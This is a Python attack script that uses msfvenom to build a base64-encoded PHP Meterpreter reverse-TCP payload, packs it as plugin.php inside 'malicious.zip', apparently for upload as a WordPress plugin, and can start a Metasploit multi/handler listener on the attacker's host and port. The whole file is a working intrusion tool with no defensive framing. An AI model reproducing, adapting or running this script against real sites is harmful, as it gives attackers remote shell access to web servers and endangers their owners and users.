#!/usr/bin/env python3

import os, random, sys, zipfile, subprocess, requests

try:

	LHOST = 'LHOST=' + str(sys.argv[1])
	LPORT = 'LPORT=' + str(sys.argv[2])
	PAYLOAD = 'php/meterpreter/reverse_tcp'
	HANDLER = sys.argv[3]

except IndexError:

	print('\n')
	print("Usage: %s [LHOST] [LPORT] [HANDLER]" % sys.argv[0])
	print("Example: %s 192.168.0.6 8888 Y" % sys.argv[0])
	sys.exit()

def generate_plugin(LHOST, LPORT, PAYLOAD):

	# COMPROBANDO MSFVENOM
	print("[*] Checking if msfvenom installed")
	if "msfvenom" in os.listdir("/usr/bin/"):
		print("[+] msfvenom installed")
	else:
		print("[-] msfvenom NO instalado")
		sys.exit()

	# GENERAR PAYLOAD
	print("[+] Generating payload To file")
	create_payload = subprocess.Popen(
		['msfvenom', '-p', PAYLOAD, LHOST, LPORT,
		'-e', 'php/base64', '-f', 'raw'], stdout=subprocess.PIPE).communicate()[0]

	# Write Our Payload To A File
	payload_file = open('plugin.php', 'wb')
	payload_file.write(b"<?php ")
	payload_file.write(create_payload)
	payload_file.write(b" ?>")
	payload_file.close()

	# Create Zip With Payload
	print("[+] Writing files to zip")
	make_zip = zipfile.ZipFile('malicious.zip', 'w')
	make_zip.write('plugin.php')
	print("[+] Cleaning up files")
	os.system("rm plugin.php")


def handler(LHOST, LPORT, PAYLOAD):
	# Write MSF ressource file
	print("[+] Launching handler")
	handler = "use exploit/multi/handler\n"
	handler += "set PAYLOAD %s\n" % PAYLOAD
	handler += "set LHOST %s\n" % LHOST.lstrip('LHOST=')
	handler += "set LPORT %s\n" % LPORT.lstrip('LPORT=')
	handler += "exploit"
	handler_file = open('wordpress.rc', 'w')
	handler_file.write(handler)
	handler_file.close()
	# Start MetaSploit and setup listener
	os.system("msfconsole -r wordpress.rc")


# Generate Plugin
generate_plugin(LHOST, LPORT, PAYLOAD)
# Handler
if HANDLER == 'Y':
	handler(LHOST, LPORT, PAYLOAD)
else:
	sys.exit()
